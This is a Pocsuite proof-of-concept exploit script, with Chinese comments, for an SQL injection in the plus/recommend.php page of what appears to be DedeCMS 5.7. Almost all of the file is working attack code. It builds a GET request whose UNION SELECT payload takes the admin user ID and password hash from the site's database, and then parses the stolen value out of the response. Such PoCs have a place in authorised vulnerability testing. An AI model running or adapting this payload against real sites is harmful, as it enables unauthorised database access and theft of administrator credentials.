#!/usr/bin/python
# -*- coding: utf-8 -*-
from pocsuite.net import req
from pocsuite.poc import Output, POCBase
from pocsuite.utils import register
class TestPOC(POCBase):
    name = 'plus/recommend 注入漏洞利用EXP'
    vulID = '6' 
    author = ['bey0nd']
    vulType = 'SQL Injection'
    version = '1.0'    # default version: 1.0
    references = ['http://www.wooyun.org/']
    desc = '''
            开发人员在修补漏洞的时候只修复了少数的变量而遗漏了其他变量，使其他变量直接
            带入了SQL语句中，可以通过字符来转义掉一个单引号，逃逸单引号，产生SQL注入。
            此注入为报错注入，可以通过UpdateXML函数进行注入。
        '''

    vulDate = '2016-12-07'
    createDate = '2016-12-07'
    updateDate = '2016-12-07'

    appName = ''
    appVersion = '5.7'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        # print self.url
        target = self.url + "plus/recommend.php?action=&aid=1&_FILES[type][tmp_name]=\%27%20or%20mid=@`\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\%27`+&_FILES[type][name]=1.jpg&_FILES[type][type]=application/octet-stream&_FILES[type][size]=4294"
        # print target
        html = req.get(target).text
        start = html.find("<h2>")
        if(start!=-1):
            end = html.find("</h2>")
            
            result['DBInfo'] = {}
            result['DBInfo']['Username'] = html[start+7:end]
        return self.parse_output(result)


        

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Failed')
        return output


register(TestPOC)
